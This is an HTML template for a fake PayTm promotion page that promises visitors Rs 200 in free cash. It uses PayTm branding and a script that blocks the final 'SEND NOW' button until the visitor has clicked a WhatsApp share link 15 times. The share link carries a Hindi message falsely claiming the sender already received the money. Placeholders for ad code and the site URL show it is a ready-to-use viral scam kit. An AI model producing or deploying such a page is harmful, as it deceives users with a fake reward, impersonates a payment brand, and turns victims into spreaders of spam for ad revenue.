

<html lang="en">


<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 <meta property="og:locale" content="en" />
<title>PayTm Offer! You Have Won Free Rs 200 PayTm Cash</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta property="og:type" content="website" />
    <meta property="og:title" content=" Earn Free PayTm Rs.200 Cash for Every Indian " />
     <link rel="shortcut icon" href="/sicon.png" type="image/x-icon">
    <meta property="og:url" content="index.php" />
    <meta property="og:description" content="Try it now" />
    <meta property="og:site_name" content="Free Rs.200 PayTm Cash" />
    <meta property="og:image" content="http://paytm.promasti.com"/>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="style.css"/>
<link rel="stylesheet" href="../www.w3schools.com/w3css/4/w3.css">
</head>
<body>
    
    
 <div class="content">

    
<div class="container2">
<header>
    <div class="h_logo">
        <img src="Paytmlogo.jpg" height="auto" />
    </div>
    <h1><b>Get Free Rs.200 PayTm Cash</b></h1>	
</header>


<div class="container">
<center>
Adsence Code Here
</center>
 

  <center><b>
<div class="w3-container w3-grey round">

<br>
   <font color="blue">Hello</font> <font color="blue"><b> Dear,</b></font><br>
<font color="blue">Your PayTm Number</font> 
<font color="red"><b> </b></font> <font color="blue"> is Eligible For 200 PayTm Cash</font><br><br><font color="green">You need to Share on Whatsapp 15 Friends/Groups to tell about 200Rs PayTm Cash</font>
<br><br> <font color="#177ec4">After invite, Click on ( SEND NOW ). Button</font>
<br><br>
               
<center>
</center>                
<br>		      
            	
                    <a style="width:100%; text-align:center; display:block; margin-bottom:10px;" href="whatsapp://send?text=Jaldi se Open kro isko...
 
Free me 200 ka PayTm Cash mil rha hain, tum V Le Lo..... Mere number p to ho gya 200 ka.... only 2mint  me...!
 
 Website URL Here" data-action="share/whatsapp/share" class="whatsapp aadi">
                        INVITE FRIENDS     
                    </a>
   <center>
   Adsence Code Here
   </center>
                    <a style="width:100%; text-align:center; display:block; margin-top:10px;" href="final.php" class="final aadi" onclick="alert("hi")">
                      SEND NOW
                    </a>
<br> 
     </div>

<marquee behavior="scroll" direction="left">
<img src="img/a.jpg" width="200" height="100">
<img src="img/b.jpg" width="200" height="100">
<img src="img/c.jpg" width="200" height="100">
<img src="img/d.jpg" width="200" height="100">
<img src="img/e.jpg" width="200" height="100">
<img src="img/f.jpg" width="200" height="100">
<img src="img/d.jpg" width="200" height="100">
<img src="img/a.jpg" width="200" height="100">
<img src="img/b.jpg" width="200" height="100">
<img src="img/c.jpg" width="200" height="100">
<img src="img/e.jpg" width="200" height="100">

</marquee>  


</br>

<center> Adsence Code Here</center>
        </div>
</div>
</div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script>
var cl1 = 0;
var max_val=15;
$('document').ready(function(){
   
    $('.whatsapp').click(function(){
       cl1++;
        
   });
    $('.final').click(function(e){
        if(cl1 < max_val){
            alert("You need to share in minimum 15 Friends or Groups.  "+ eval(parseInt(max_val) - parseInt(cl1)) +" invite remaining");
            e.preventDefault();
        }    
        else{
            window.location.href='./final.php';
        }
    });
    
});
</script>



 
</body>
</html>
